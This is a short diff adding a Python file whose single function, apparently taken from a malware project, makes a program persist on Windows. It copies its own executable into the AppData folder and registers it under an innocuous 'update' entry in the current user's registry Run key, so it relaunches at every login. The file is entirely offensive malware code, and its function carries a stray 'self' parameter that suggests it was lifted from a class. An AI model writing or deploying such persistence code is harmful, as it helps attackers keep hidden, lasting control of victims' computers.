@@ -1,0 +1,12 @@
+#!/usr/bin/env python
+import os
+import shutil
+import subprocess
+import sys
+
+
+def persistence(self):
+        file_location = os.environ["appdata"] + "\\name.exe"
+        if not os.path.exists(file_location):
+            shutil.copyfile(sys.executable, file_location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + file_location + '"', shell=True)
